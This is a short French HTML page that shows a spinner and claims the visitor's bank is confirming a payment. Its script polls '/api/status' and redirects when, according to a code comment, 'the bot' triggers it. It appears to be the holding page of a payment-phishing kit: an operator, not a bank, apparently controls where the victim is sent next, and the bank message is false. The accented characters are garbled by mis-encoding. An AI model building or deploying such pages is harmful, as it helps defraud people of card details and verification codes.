<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>V√©rification du paiement</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f8f8f8;
      color: #333;
      text-align: center;
      padding-top: 120px;
    }
    .spinner {
      margin: 40px auto;
      width: 80px;
      height: 80px;
      border: 8px solid #ddd;
      border-top: 8px solid #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    h2 {
      font-size: 1.4em;
      margin-top: 20px;
      color: #444;
    }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <h2>üí≥ V√©rification de votre paiement en cours...</h2>
  <p>Merci de patienter, la banque est en train de confirmer votre transaction.</p>

  <script>
    // üîÅ V√©rifie r√©guli√®rement si le bot a d√©clench√© la redirection
    async function checkStatus() {
      const res = await fetch('/api/status');
      const data = await res.json();
      if (data.redirect) {
        window.location.href = data.redirect;
      } else {
        setTimeout(checkStatus, 2000);
      }
    }
    checkStatus();
  </script>
</body>
</html>
